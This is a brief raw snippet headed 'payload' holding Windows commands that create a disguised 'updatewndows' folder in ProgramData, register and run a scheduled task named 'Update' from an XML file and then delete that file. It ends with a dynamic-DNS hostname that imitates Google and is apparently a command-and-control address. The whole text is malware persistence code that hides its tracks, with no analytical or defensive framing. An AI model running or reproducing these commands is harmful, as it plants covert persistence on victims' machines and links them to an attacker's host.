# payload

mkdir %systemdrive%\ProgramData\updatewndows

schtasks /create /xml %systemdrive%\ProgramData\updatewndows\Update.xml /tn Update
del %systemdrive%\ProgramData\updatewndows\Update.xml
schtasks /run /tn Update



googleapp.bounceme.net
